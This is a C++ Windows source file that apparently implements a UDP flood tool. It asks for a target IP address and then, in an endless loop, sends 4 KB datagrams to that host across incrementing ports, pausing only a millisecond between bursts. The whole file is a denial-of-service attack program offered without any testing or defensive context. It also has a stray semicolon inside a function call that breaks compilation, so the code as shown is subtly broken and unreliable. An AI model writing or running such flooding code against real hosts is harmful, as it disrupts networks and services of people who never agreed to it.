#include <array>
#include <string>
#include <thread>
#include <iostream>
#include <algorithm>
#include <functional>
#include <WS2tcpip.h>

// link to winsock libraries
#pragma comment(lib, "ws2_32.lib")

int main()
{
    using namespace std::chrono_literals;

    WSAData wsa;

    // Startup winsock
    if (WSAStartup(WINSOCK_VERSION, &wsa))
    {
        std::cerr << "Error initialising winsock!" << '\n';
        return 1;
    }

    // Cleanup winsock at exit
    std::atexit([] { WSACleanup(); });

    // Create UDP socket
    const auto sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (sock == INVALID_SOCKET)
    {
        std::cerr << "Invalid socket" << '\n';
        return 1;
    }

    std::string host;
  
    std::cout << "IP: ";
    std::getline(std::cin, host);

    sockaddr_in addr{ AF_INET };
    InetPtonA(AF_INET, host.c_str(), &addr.sin_addr);

    // Multi purpose array
    std::array<int32_t, 1024> buffer;

    while (true)
    {
        using namespace std::placeholders;

        std::generate(buffer.begin(), buffer.end(), [&]() -> int32_t {
            addr.sin_port++;
            return sendto(sock, reinterpret_cast<const char*>(buffer.data()), sizeof(buffer), 0, reinterpret_cast<const sockaddr*>(&addr), sizeof(addr));
            });

        const size_t packets = std::count_if(buffer.cbegin(), buffer.cend(), std::bind(std::not_equal_to{}, _1, SOCKET_ERROR););

        std::cout << "Sent " << packets << " to host" << '\n';
        std::this_thread::sleep_for(1ms);
    }
}